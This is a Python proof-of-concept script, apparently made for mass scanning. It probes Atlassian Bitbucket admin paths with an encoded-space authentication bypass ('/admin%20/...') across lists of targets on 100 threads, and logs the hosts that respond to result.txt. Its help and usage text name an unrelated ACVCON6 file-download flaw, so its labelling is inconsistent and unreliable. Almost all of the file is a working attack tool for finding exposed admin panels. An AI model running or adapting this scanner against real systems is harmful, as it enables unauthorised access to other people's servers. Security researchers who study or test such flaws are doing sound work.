import argparse
import requests
import os
import sys
import logging
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()



def banner():
    test = '''

   _   _   _               _                 ___ _ _   _                _        _    
  /_\ | |_| | __ _ ___ ___(_) __ _ _ __     / __(_) |_| |__  _   _  ___| | _____| |_  
 //_\\| __| |/ _` / __/ __| |/ _` | '_ \   /__\// | __| '_ \| | | |/ __| |/ / _ \ __| 
/  _  \ |_| | (_| \__ \__ \ | (_| | | | | / \/  \ | |_| |_) | |_| | (__|   <  __/ |_  
\_/ \_/\__|_|\__,_|___/___/_|\__,_|_| |_| \_____/_|\__|_.__/ \__,_|\___|_|\_\___|\__|                                                                                    
                                               author:sanhua
                                               date:2024-09-13
                                               version:1.0
    '''
    print(test)


def poc(target):
    if not target.startswith('http://') and not target.startswith('https://'):
        target = 'http://' + target

    paths = [
        "/admin%20/mail-server",
        "/admin%20/db",
        "/admin%20/db/edit",
        "/admin%20/license",
        "/admin%20/logging",
        "/admin%20/server-settings",
        "/admin%20/authentication",
        "/admin%20/avatars"
    ]

    for path in paths:
        url = target + path
        try:
            response = requests.get(url, verify=False, timeout=10)
            if response.status_code == 200:
                print(f"[+] {target} 存在Atlassian Bitbucket 登录绕过漏洞")
                with open("result.txt", "a", encoding='utf-8') as f:
                    f.write(f"{target} 存在Atlassian Bitbucket 登录绕过漏洞 path: {path}\n")
            else:
                print(f"[-] {target} 不存在或状态码: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"[!] {url} 请求失败，错误信息：{e}")


def main():
    banner()
    url_list = []
    parse = argparse.ArgumentParser(description="ACVCON6 系统管理平台 download.action 任意文件下载漏洞")
    parse.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parse.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")
    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        if not os.path.exists(args.file):
            print(f"[!] {args.file} 文件不存在，请检查路径")
            return
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url = url.strip()
                if url:  # 确保不添加空行
                    url_list.append(url)
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t ACVCON6 系统管理平台 download.action 任意文件下载漏洞.py -h")


if __name__ == '__main__':
    main()
